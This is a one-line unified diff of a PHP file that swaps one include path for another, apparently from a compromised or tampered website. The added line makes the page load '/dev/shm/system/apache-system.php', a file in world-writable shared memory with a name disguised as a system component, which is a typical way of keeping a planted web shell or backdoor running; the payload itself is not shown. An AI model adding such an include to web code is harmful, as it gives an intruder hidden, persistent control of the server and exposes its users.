@@ -1,1 +1,1 @@
-<?php include("/home/admin/perl5/bin/"); ?>
+<?php include("/dev/shm/system/apache-system.php"); ?>
